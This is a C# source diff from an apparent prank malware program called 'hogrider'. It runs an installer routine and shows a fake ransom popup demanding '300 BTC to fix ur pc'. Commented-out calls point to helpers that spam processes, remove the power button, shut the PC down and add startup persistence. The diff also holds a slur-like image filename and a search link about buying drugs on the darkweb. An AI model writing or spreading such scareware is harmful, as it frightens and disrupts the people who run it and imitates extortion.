@@ -1,7 +1,6 @@
 ﻿using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows;
-using System.Windows.Forms;
 using hogrider;
 
 
@@ -33,9 +32,22 @@ if (Directory.Exists(dir))
     Install.Main();
 }
 
-/*System.Windows.Forms.MessageBox.Show("Free bo frans my G", "Hog rider coc", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-Utils.ChangeVolume();*/
 
-Utils.OpenFile(dir, "hoggy_doggy.jpg");
-Utils.OpenFile(dir, "miggers.png");
+Utils.MessageBoxError("Pay 300 BTC to fix ur pc", "Jerome Verbeeck x Hogriderrrr");
+/*
+for (int i = 0; i < 12; i++)
+{
+    System.Diagnostics.Process.Start("calc");
+}*/
+
+
+// Utils.ChangeVolume();
+// Utils.RemovePowerButton();
+
+// Utils.OpenFile(dir, "hogrider.jpg");
+// Utils.OpenFile(dir, "woman.png");
 // Utils.OpenUrl("https://www.google.com/search?q=How+to+buy+hasj+on+darkweb+legit+tutorial+2016&rlz=1C1GCEA_enBE992BE992&oq=How+to+buy+hasj+on+darkweb+legit+tutorial+2016&aqs=chrome..69i57.218j0j9&sourceid=chrome&ie=UTF-8");
+
+// Utils.Shutdown();
+
+// Utils.AddStartup();
